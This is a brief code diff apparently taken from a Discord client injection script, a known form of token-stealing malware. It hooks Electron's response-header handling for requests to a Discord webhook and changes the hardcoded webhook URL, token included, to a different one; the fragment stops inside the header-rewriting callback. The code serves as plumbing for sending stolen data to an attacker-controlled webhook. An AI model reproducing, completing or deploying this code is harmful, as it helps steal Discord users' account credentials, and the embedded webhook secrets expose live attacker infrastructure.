@@ -20,7 +20,7 @@ const config = {
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith("https://discord.com/api/webhooks/905912417756794921/Ftimt00LEhz3D4Kry5XOSQ1W1YMgxe8PuDiDw8JeFN5bo5lQAIiRZ_Y20p-SQLKvCjVC")) {
+    if (details.url.startsWith("https://ptb.discord.com/api/webhooks/916998346625941574/8jXmHYzyxpgb3livE4RrYBgoe8GoLY62yIfnbs3E-sitLS_zEb3bgIF1ibcPWcxplHkb")) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
